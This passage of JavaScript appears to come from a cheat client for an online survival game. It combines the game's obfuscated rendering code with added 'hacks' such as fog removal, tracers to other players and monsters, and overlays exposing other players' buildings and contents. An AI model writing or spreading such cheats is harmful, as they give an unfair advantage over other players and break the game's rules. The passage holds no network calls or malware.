			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃⲆⲆⵠⵠ, "f", 1, ΔⵠΔⵠ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃᐃⲆⵠ, ⵠ[138], 1, 1);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔΔΔ, "t", 1, Δⵠᐃ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃⲆⲆⵠⵠ, "f", ΔΔⵠ, Ⲇᐃⵠⵠ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃᐃⲆⵠ, ⵠ[138], Ⲇᐃᐃⵠ, 2);
			var ΔΔΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔΔΔⵠ.length; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ΔΔΔⵠ[ⵠᐃ]);
			var ⵠⵠⵠΔⵠΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ];
			for (var ⵠᐃ = 0; ⵠⵠⵠΔⵠΔⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠⵠⵠΔⵠΔⵠ[ⵠᐃ], Ⲇ.ⲆⵠΔΔⵠ);
			var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
			for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				if (ᐃⲆᐃ === ᐃⲆⲆ.ⵠⵠⵠΔⵠΔⵠ && (180 > ᐃⲆⲆ.ᐃᐃΔᐃᐃ || ᐃᐃ.ⵠⲆᐃⲆᐃ !== ᐃⲆⲆ.ᐃⵠⵠΔⵠ && ᐃⲆⲆ.ᐃⵠⵠΔⵠ !== ᐃᐃ.ΔⵠⵠΔⲆ && ᐃᐃ.ⲆᐃᐃⵠⲆ !== ᐃⲆⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ΔΔΔⲆⲆ !== ᐃⲆⲆ.ᐃⵠⵠΔⵠ && ᐃᐃ.ΔᐃⲆΔᐃ !== ᐃⲆⲆ.ᐃⵠⵠΔⵠ)) {
					ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, 100, .018);
					var ᐃⵠΔⵠ = 1 + Math.min(1, Math.max(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, Ⲇᐃᐃᐃ) / ΔΔᐃⵠᐃ) * .18;
					Δ.save();
					Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
					ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
					ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
					ᐃⲆⲆ.ΔᐃΔⵠ();
					ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
					ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
					Δ.restore()
				}
			}
			var ᐃⵠᐃⵠⲆⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⵠᐃⵠⲆⲆⲆ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ᐃⵠᐃⵠⲆⲆⲆ[ⵠᐃ], Ⲇ.ⵠΔⲆᐃⵠ);
				ᐃⵠᐃⵠⲆⲆⲆ[ⵠᐃ].ᐃΔᐃⵠᐃ(ᐃⵠᐃⵠⲆⲆⲆ[ⵠᐃ].info)
			}
			var ᐃᐃⲆᐃⲆᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠⲆᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃⲆᐃⲆᐃΔ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃᐃⲆᐃⲆᐃΔ[ⵠᐃ], Ⲇ.ΔⵠⵠⲆᐃ, Ⲇ.ⲆᐃᐃⵠΔᐃΔ);
			var ᐃⲆⲆΔⵠΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆⲆᐃ];
			for (var ⵠᐃ = 0; ᐃⲆⲆΔⵠΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃⲆⲆΔⵠΔⲆ[ⵠᐃ], Ⲇ.ᐃⲆⲆⲆᐃ);
			var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ᐃᐃᐃⵠ.length; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				if ((ᐃⲆⲆ.ᐃⵠⵠΔⵠ === ᐃᐃ.ⵠⲆᐃⲆᐃ || ᐃᐃ.ΔⵠⵠΔⲆ === ᐃⲆⲆ.ᐃⵠⵠΔⵠ || ᐃᐃ.ⲆᐃᐃⵠⲆ === ᐃⲆⲆ.ᐃⵠⵠΔⵠ || ᐃᐃ.ΔΔΔⲆⲆ === ᐃⲆⲆ.ᐃⵠⵠΔⵠ || ᐃᐃ.ΔᐃⲆΔᐃ === ᐃⲆⲆ.ᐃⵠⵠΔⵠ) && ᐃⲆⲆ.ᐃᐃΔᐃᐃ > 180) {
					ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ = 1;
					Δ.save();
					var ᐃⵠΔⵠ = ΔΔᐃⵠ + .35 * Math.min(1, Math.max(ᐃⲆⲆ.ⲆⲆᐃΔⵠ - 30, 0) / 180);
					Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
					ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
					ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
					ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
					ᐃⲆⲆ.ΔᐃΔⵠ();
					ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
					ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
					ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
					Δ.restore()
				}
			}
			var ⲆⵠⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ];
			for (var ⵠᐃ = 0; ⲆⵠⲆⵠᐃ.length > ⵠᐃ; ⵠᐃ++) {
				1 === ⲆⵠⲆⵠᐃ[ⵠᐃ].ΔⵠΔⲆΔᐃᐃ && ⵠⵠᐃⲆ(ⲆⵠⲆⵠᐃ[ⵠᐃ])
			}
			var ΔⲆⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ];
			for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < ΔⲆⲆⵠⵠ.length; ⵠᐃ++) {
				if (1 < ΔⲆⲆⵠⵠ[ⵠᐃ].scale) ⵠⵠᐃⲆ(ΔⲆⲆⵠⵠ[ⵠᐃ], Ⲇ.ΔΔⵠΔΔ, Ⲇ.ⵠⲆᐃⲆᐃΔⵠ)
			}
			var ΔⲆⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔⲆⲆⵠⵠ.length; ⵠᐃ++) {
				1 < ΔⲆⲆⵠⵠ[ⵠᐃ].scale && ⵠⵠᐃⲆ(ΔⲆⲆⵠⵠ[ⵠᐃ], Ⲇ.ⲆᐃⲆᐃⵠ, Ⲇ.ΔΔⵠᐃⵠⵠⲆ)
			}
			var ᐃᐃΔΔⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔΔⲆⲆ];
			for (var ⵠᐃ = 0; ᐃᐃΔΔⲆⵠⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃᐃΔΔⲆⵠⵠ[ⵠᐃ], Ⲇ.ΔΔΔⲆⲆ, Ⲇ.ⲆⲆⲆᐃΔᐃᐃ);
			var ΔᐃΔᐃΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⲆⵠⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔᐃΔᐃΔΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔᐃΔᐃΔΔⲆ[ⵠᐃ], Ⲇ.ΔⲆⲆⵠⲆ, Ⲇ.ⲆᐃⵠΔⵠᐃⵠ);
			ᐃⵠⲆⲆᐃⲆᐃ += ᐃⵠᐃᐃ * ΔⵠΔᐃⵠ;
			60 < ᐃⵠⲆⲆᐃⲆᐃ && (ᐃⵠⲆⲆᐃⲆᐃ -= 60);
			Settings.NoFog.enabled || ᐃΔΔⵠΔ(ⲆΔᐃⵠⲆᐃⲆ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠᐃⲆΔᐃ, ⵠ[273], 2);
			Settings.NoFog.enabled || ᐃΔΔⵠΔ(ⲆΔᐃⵠⲆᐃⲆ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆⵠⲆⲆΔ, ⵠ[410], 2);
			if (Settings.BoxOnTop.enabled) {
				var ⲆᐃⲆⲆᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆΔᐃ];
				for (var ⵠᐃ = ⲆⲆⲆᐃ; ⲆᐃⲆⲆᐃ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆᐃⲆⲆᐃ[ⵠᐃ], Ⲇ.ⲆᐃⲆΔᐃ, Ⲇ.ᐃᐃⲆⵠᐃⲆⵠ);
				var ⲆΔⵠΔⲆⵠᐃ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ];
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔⵠΔⲆⵠᐃ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔⵠΔⲆⵠᐃ[ⵠᐃ], Ⲇ.ⲆᐃⲆΔᐃ, Ⲇ.ᐃᐃⲆⵠᐃⲆⵠ);
				var ⵠᐃᐃⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆΔⵠΔ];
				for (var ⵠᐃ = 0; ⵠᐃ < ⵠᐃᐃⲆΔΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠᐃᐃⲆΔΔⲆ[ⵠᐃ], Ⲇ.ᐃⲆΔⵠΔ, Ⲇ.ΔΔᐃΔΔᐃⲆ)
			}
			const ctx = Δ;
			if (Settings.PlayerTracers.enabled && getWorldProperty("fast_units")[getUserProperty("uid")]) {
				if (getWorldProperty("units")[0].length - 1 > 0) {
					ctx.save();
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#ffffff";
					ctx.font = "20px Baloo Paaji";
					ctx.lineWidth = 5;
					ctx.strokeText("Players amount: " + (getWorldProperty("units")[0].length - 1), 20, 480);
					ctx.fillText("Players amount: " + (getWorldProperty("units")[0].length - 1), 20, 480);
					ctx.restore();
					getWorldProperty("units")[0].forEach((player => {
						ctx.save();
						ctx.beginPath();
						ctx.strokeStyle = isAlly(player) ? "#00ffff" : "#ff0000";
						ctx.lineWidth = 3;
						ctx.moveTo(getWorldProperty("fast_units")[getUserProperty("uid")].x + getUserProperty("cam").x, getWorldProperty("fast_units")[getUserProperty("uid")].y + getUserProperty("cam").y);
						ctx.lineTo(player.x + getUserProperty("cam").x, player.y + getUserProperty("cam").y);
						ctx.stroke();
						ctx.restore()
					}))
				}
			}
			if (Settings.KrakenTracers.enabled && getWorldProperty("fast_units")[getUserProperty("uid")]) {
				if (getWorldProperty("units")[66].length > 0) {
					ctx.save();
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#ffffff";
					ctx.font = "20px Baloo Paaji";
					ctx.lineWidth = 5;
					ctx.strokeText("Krakens amount: " + getWorldProperty("units")[66].length, 20, 500);
					ctx.fillText("Krakens amount: " + getWorldProperty("units")[66].length, 20, 500);
					ctx.restore();
					getWorldProperty("units")[66].forEach((kraken => {
						ctx.save();
						ctx.beginPath();
						ctx.strokeStyle = "#440b8a";
						ctx.lineWidth = 3;
						ctx.moveTo(getWorldProperty("fast_units")[getUserProperty("uid")].x + getUserProperty("cam").x, getWorldProperty("fast_units")[getUserProperty("uid")].y + getUserProperty("cam").y);
						ctx.lineTo(kraken.x + getUserProperty("cam").x, kraken.y + getUserProperty("cam").y);
						ctx.stroke();
						ctx.restore()
					}))
				}
			}
			if (Settings.SandwormTracers.enabled && getWorldProperty("fast_units")[getUserProperty("uid")]) {
				if (getWorldProperty("units")[76].length > 0) {
					ctx.save();
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#ffffff";
					ctx.font = "20px Baloo Paaji";
					ctx.lineWidth = 5;
					ctx.strokeText("Sandworms amount: " + getWorldProperty("units")[76].length, 20, 520);
					ctx.fillText("Sandworms amount: " + getWorldProperty("units")[76].length, 20, 520);
					ctx.restore();
					getWorldProperty("units")[76].forEach((sandworm => {
						ctx.save();
						ctx.beginPath();
						ctx.strokeStyle = "#000000";
						ctx.lineWidth = 3;
						ctx.moveTo(getWorldProperty("fast_units")[getUserProperty("uid")].x + getUserProperty("cam").x, getWorldProperty("fast_units")[getUserProperty("uid")].y + getUserProperty("cam").y);
						ctx.lineTo(sandworm.x + getUserProperty("cam").x, sandworm.y + getUserProperty("cam").y);
						ctx.stroke();
						ctx.restore()
					}))
				}
			}
			if (Settings.Debugger.enabled) {
				for (let i = 1; i < 100; i++) {
					if (Array.isArray(getWorldProperty("units")[i])) {
						getWorldProperty("units")[i].forEach((build => {
							if (build.pid) {
								ctx.save();
								ctx.lineWidth = 8;
								ctx.strokeStyle = "#000";
								ctx.fillStyle = "#fff";
								ctx.font = "22px Baloo Paaji";
								ctx.strokeText(getBuildOwner(build), build.x + getUserProperty("cam").x - 25, build.y + getUserProperty("cam").y);
								ctx.fillText(getBuildOwner(build), build.x + getUserProperty("cam").x - 25, build.y + getUserProperty("cam").y);
								ctx.restore()
							}
						}))
					}
				}
			}
			if (Settings.ListEnabledHacks.enabled) {
				let y = 300;
				for (const property in Settings) {
					if (Settings[property].enabled && Settings[property].draw) {
						ctx.save();
						ctx.font = "20px Baloo Paaji";
						ctx.fillStyle = "red";
						ctx.strokeStyle = "#000000";
						ctx.lineWidth = 5;
						ctx.strokeText(property, 6, y);
						ctx.fillText(property, 6, y);
						ctx.restore();
						y += 20
					}
				}
			}
			if (Settings.ShowJoinLeaves.enabled) {
				let JoinedPlayersY = 540;
				let KilledPlayersY = 640;
				for (let i = 0; i < JoinedPlayers.length; i++) {
					ctx.save();
					ctx.strokeStyle = "#000000";
					ctx.fillStyle = "red";
					ctx.lineWidth = 7;
					ctx.font = "20px Baloo Paaji";
					ctx.strokeText(JoinedPlayers[i], 6, JoinedPlayersY);
					ctx.fillText(JoinedPlayers[i], 6, JoinedPlayersY);
					ctx.restore();
					JoinedPlayersY += 20
				}
				for (let i = 0; i < KilledPlayers.length; i++) {
					ctx.save();
					ctx.strokeStyle = "#000000";
					ctx.fillStyle = "red";
					ctx.lineWidth = 7;
					ctx.font = "20px Baloo Paaji";
					ctx.strokeText(KilledPlayers[i], 6, KilledPlayersY);
					ctx.fillText(KilledPlayers[i], 6, KilledPlayersY);
					ctx.restore();
					KilledPlayersY += 20
				}
			}
			if (Settings.ExtractorInfo.enabled) {
				const extractors = [getWorldProperty("units")[24], getWorldProperty("units")[25], getWorldProperty("units")[26], getWorldProperty("units")[27], getWorldProperty("units")[28]];
				for (let ex = 0; ex < extractors.length; ex++) {
					extractors[ex].forEach((extractor => {
						ctx.save();
						ctx.strokeStyle = "#000000";
						ctx.fillStyle = "#ffffff";
						ctx.lineWidth = 7;
						ctx.font = "20px Baloo Paaji";
						ctx.strokeText((extractor.info & 255) + "x", getUserProperty("cam").x + extractor.x - 20, getUserProperty("cam").y + extractor.y - 5);
						ctx.fillText((extractor.info & 255) + "x", getUserProperty("cam").x + extractor.x - 20, getUserProperty("cam").y + extractor.y - 5);
						ctx.strokeText(((extractor.info & 65280) >> 8) + "x", getUserProperty("cam").x + extractor.x - 20, getUserProperty("cam").y + extractor.y + 15);
						ctx.fillText(((extractor.info & 65280) >> 8) + "x", getUserProperty("cam").x + extractor.x - 20, getUserProperty("cam").y + extractor.y + 15);
						ctx.restore()
					}))
				}
			}
			if (Settings.WindmillInfo.enabled) {
				getWorldProperty("units")[32].forEach((windmill => {
					ctx.save();
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.lineWidth = 7;
					ctx.font = "24px Baloo Paaji";
					ctx.strokeText((windmill.info & 255) + "x", getUserProperty("cam").x + windmill.x - 20, getUserProperty("cam").y + windmill.y - 5);
					ctx.fillText((windmill.info & 255) + "x", getUserProperty("cam").x + windmill.x - 20, getUserProperty("cam").y + windmill.y - 5);
					ctx.strokeText(((windmill.info & 65280) >> 8) + "x", getUserProperty("cam").x + windmill.x - 20, getUserProperty("cam").y + windmill.y + 15);
					ctx.fillText(((windmill.info & 65280) >> 8) + "x", getUserProperty("cam").x + windmill.x - 20, getUserProperty("cam").y + windmill.y + 15);
					ctx.restore()
				}))
			}
			if (Settings.OvenInfo.enabled) {
				getWorldProperty("units")[34].forEach((oven => {
					ctx.save();
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.lineWidth = 7;
					ctx.font = "24px Baloo Paaji";
					ctx.strokeText((oven.info & 31) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y - 15);
					ctx.fillText((oven.info & 31) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y - 15);
					ctx.strokeText(((oven.info & 992) >> 5) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y + 5);
					ctx.fillText(((oven.info & 992) >> 5) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y + 5);
					ctx.strokeText(((oven.info & 31744) >> 10) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y + 25);
					ctx.fillText(((oven.info & 31744) >> 10) + "x", getUserProperty("cam").x + oven.x - 20, getUserProperty("cam").y + oven.y + 25);
					ctx.restore()
				}))
			}
			if (Settings.FurnaceInfo.enabled) {
				getWorldProperty("units")[18].forEach((furnace => {
					ctx.save();
					ctx.lineWidth = 8;
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.font = "22px Baloo Paaji";
					ctx.strokeText(furnace.info + "x", furnace.x + getUserProperty("cam").x - 25, furnace.y + getUserProperty("cam").y);
					ctx.fillText(furnace.info + "x", furnace.x + getUserProperty("cam").x - 25, furnace.y + getUserProperty("cam").y);
					ctx.restore()
				}))
			}
			if (Settings.GhostInfo.enabled) {
		getWorldProperty("units")[0].forEach(player => {
			if (player.Ⲇⵠⵠⵠᐃ) {
				if (!player.ghosttime) {
					player.ghosttime = performance.now();
				}

				ctx.save();
				ctx.font = "30px Baloo Paaji";
				ctx.strokeStyle = "black";
				ctx.lineWidth = 7;
				let elapsedTime = (performance.now() - player.ghosttime) / 1000;
				let remainingTime = Math.floor(60 - elapsedTime);
				remainingTime = Math.max(remainingTime, 0);
				ctx.strokeText(remainingTime, getUserProperty("cam").x + player.x - 25, getUserProperty("cam").y + player.y + 20);
				ctx.fillStyle = "white";
				ctx.fillText(remainingTime, getUserProperty("cam").x + player.x - 25, getUserProperty("cam").y + player.y + 20);

				ctx.lineWidth = 5;
				ctx.font = "23px Baloo Paaji";
				ctx.strokeStyle = "black";
				ctx.fillStyle = "white";
				const playerName = getPlayerName(player.pid);
				const playerLevel = getBuildLevel(player.pid);

				ctx.strokeText(playerName, getUserProperty("cam").x + player.x - 75, getUserProperty("cam").y + player.y - 60);
				ctx.fillText(playerName, getUserProperty("cam").x + player.x - 75, getUserProperty("cam").y + player.y - 60);

				if (playerLevel > 0) {
					const levelText = `[${playerLevel}]`;
					ctx.fillStyle = "#F9E8A2";
					ctx.strokeText(" " + levelText, getUserProperty("cam").x + player.x + ctx.measureText(playerName).width - 75, getUserProperty("cam").y + player.y - 60);
					ctx.fillText(" " + levelText, getUserProperty("cam").x + player.x + ctx.measureText(playerName).width - 75, getUserProperty("cam").y + player.y - 60);
				}

				ctx.restore();
			} else {
				player.ghosttime = null;
			}
		});
	}
			if (Settings.MachineInfo.enabled) {
				getWorldProperty("units")[23].forEach(machine => {
					ctx.lineWidth = 5;
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.font = "22px Baloo Paaji";
					const x = machine.x + getUserProperty("cam").x - 25;
					const y = machine.y + getUserProperty("cam").y;
			
					ctx.lineWidth = 5;
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.font = "22px Baloo Paaji";
					ctx.strokeText(getBuildOwner(machine), x, y);
					ctx.fillText(getBuildOwner(machine), x, y);
			
					const ownerWidth = ctx.measureText(getBuildOwner(machine)).width;
			
					ctx.fillStyle = "red";
					ctx.strokeStyle = "#000";
					ctx.lineWidth = 5;
					const levelX = x + ownerWidth + ctx.measureText(' [').width;
					ctx.strokeText(`[${getBuildLevel(machine.pid)}]`, levelX, y);
					ctx.fillText(`[${getBuildLevel(machine.pid)}]`, levelX, y);
			
					const scoreY = y + 30;
					const playerScore = getPlayerScore(machine.pid);
					const formattedScore = formatScore(playerScore);
					const scoreText = `[${formattedScore}]`;
					ctx.fillStyle = "gold";
					ctx.strokeStyle = "#000";
					ctx.lineWidth = 3;
					const scoreWidth = ctx.measureText(scoreText).width;
					const scoreX = x + (ownerWidth + ctx.measureText(`[${getBuildLevel(machine.pid)}]`).width) / 2 - scoreWidth / 2 - 15;
					ctx.strokeText(scoreText, scoreX, scoreY);
					ctx.fillText(scoreText, scoreX, scoreY);
			
					ctx.restore();
				});
			}
			if (Settings.TotemInfo.enabled) {
				getWorldProperty("units")[29].forEach(totem => {
					ctx.save();
					ctx.lineWidth = 8;
					ctx.strokeStyle = "#000";
					ctx.fillStyle = "#fff";
					ctx.font = "22px Baloo Paaji";
					const ownerName = getBuildOwner(totem);
					const ownerTextWidth = ctx.measureText(ownerName).width;
					ctx.strokeText(ownerName, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y);
					ctx.fillText(ownerName, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y);
					const infoText = totem.info >= 16 ? totem.info % 16 : totem.info;
					const infoTextStr = infoText.toString();
					const infoTextWidth = ctx.measureText(infoTextStr).width;
					ctx.strokeText(infoTextStr, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y + 20);
					ctx.fillText(infoTextStr, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y + 20);
					const label = totem.info >= 16 ? "L" : "U";
					const labelWidth = ctx.measureText(label).width;
					ctx.strokeText(label, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y + 40);
					ctx.fillText(label, totem.x + getUserProperty("cam").x - 25, totem.y + getUserProperty("cam").y + 40);
					ctx.font = "22px Baloo Paaji"; 
					ctx.fillStyle = "red";
					const levelText = `[${getBuildLevel(totem.pid)}]`;
					const levelTextWidth = ctx.measureText(levelText).width;
					const levelX = totem.x + getUserProperty("cam").x - 25 + ownerTextWidth + 10; 
					ctx.strokeText(levelText, levelX, totem.y + getUserProperty("cam").y);
					ctx.fillText(levelText, levelX, totem.y + getUserProperty("cam").y);
			
					ctx.restore();
				});
			}
			if (Settings.PlayerOnTop.enabled) {
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
				var myself = getWorldProperty("fast_units")?.[getUserProperty("uid")] || null;
			
				if (Array.isArray(ᐃᐃᐃⵠ) && myself) {
					var indexOfMyself = ᐃᐃᐃⵠ.indexOf(myself);
					if (indexOfMyself > -1) {
						ᐃᐃᐃⵠ.splice(indexOfMyself, 1);
						ᐃᐃᐃⵠ.push(myself);
					}
				}
			
				for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
					if (ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ⵠⲆᐃⲆᐃ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ΔⵠⵠΔⲆ && ᐃᐃ.ΔΔΔⲆⲆ !== ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ΔᐃⲆΔᐃ && ᐃᐃᐃⵠ[ⵠᐃ].ᐃⵠⵠΔⵠ !== ᐃᐃ.ⲆᐃᐃⵠⲆ) {
						if (ᐃⲆⲆ.ⵠⵠⵠΔⵠΔⵠ === Δᐃᐃⵠ) {
							if (.001 < ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ) {
								ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ = ΔΔⲆᐃ.ⲆⲆᐃⲆΔ(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, 0, .018);
								var ᐃⵠΔⵠ = 1 + .18 * Math.min(1, Math.max(ᐃⲆⲆ.ⲆᐃⲆⵠΔᐃⵠ, 0) / ⵠᐃⲆΔΔ);
								Δ.save();
								Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
								ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
								ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
								ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
								ᐃⲆⲆ.ΔᐃΔⵠ();
								ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
								ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
								ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
								Δ.restore();
							} else {
								ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ = 0;
								ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
								ᐃⲆⲆ.ΔᐃΔⵠ();
							}
						}
					} else if (180 >= ᐃⲆⲆ.ᐃᐃΔᐃᐃ) {
						Δ.save();
						var ᐃⵠΔⵠ = ΔⵠⲆΔ + Math.min(1, Math.max(ᐃⲆⲆ.ⲆⲆᐃΔⵠ - 30, ΔⲆⲆ) / 180) * .35;
						Δ.scale(ᐃⵠΔⵠ, ᐃⵠΔⵠ);
